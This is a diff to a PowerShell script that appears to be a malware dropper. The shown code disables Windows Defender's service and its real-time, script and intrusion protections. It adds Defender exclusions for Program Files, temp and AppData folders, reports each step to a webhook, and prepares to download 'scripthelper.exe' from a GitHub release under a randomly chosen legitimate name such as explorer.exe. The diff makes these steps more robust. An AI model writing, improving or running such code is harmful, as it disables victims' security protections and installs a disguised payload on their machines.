@@ -67,11 +67,15 @@ try {
                     Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue | Out-Null
                     Set-Service -Name "Sense" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
                 }
-                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop | Out-Null
-                Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop | Out-Null
-                Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop | Out-Null
-                Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop | Out-Null
-                Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop | Out-Null
+                if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
+                    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop | Out-Null
+                    Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop | Out-Null
+                    Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop | Out-Null
+                    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop | Out-Null
+                    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop | Out-Null
+                } else {
+                    Send-WebhookMessage -Message "Set-MpPreference not found, skipping Defender preference settings"
+                }
                 Send-WebhookMessage -Message "Windows Defender disabled"
             } else {
                 Send-WebhookMessage -Message "Windows Defender service not found, skipping"
@@ -107,49 +111,56 @@ try {
 
     $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
     $exclusionsAdded = $true
-    foreach ($dir in $directories) {
+    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        foreach ($dir in $directories) {
+            try {
+                Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
+                Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
+            } catch {
+                $exclusionsAdded = $false
+                Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName): $_"
+            }
+        }
+
         try {
-            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
+            Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Added exclusion: $tempFolder"
         } catch {
             $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName): $_"
+            Send-WebhookMessage -Message "Error adding exclusion for $tempFolder: $_"
         }
-    }
 
-    try {
-        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
-        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
-    } catch {
-        $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for $tempFolder: $_"
-    }
+        try {
+            Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
+        } catch {
+            $exclusionsAdded = $false
+            Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder: $_"
+        }
 
-    try {
-        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
-        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
-    } catch {
+        try {
+            Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
+            Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
+        } catch {
+            $exclusionsAdded = $false
+            Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder: $_"
+        }
+    } else {
+        Send-WebhookMessage -Message "Add-MpPreference not found, skipping exclusion settings"
         $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder: $_"
-    }
-
-    try {
-        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
-        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
-    } catch {
-        $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder: $_"
     }
 
     if ($exclusionsAdded) {
         $exeNames = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
         $selectedExe = $exeNames | Get-Random
         $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
-        try {
-            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
-        } catch {
-            Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
+        if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+            try {
+                Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
+                Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
+            } catch {
+                Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
+            }
         }
 
         $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
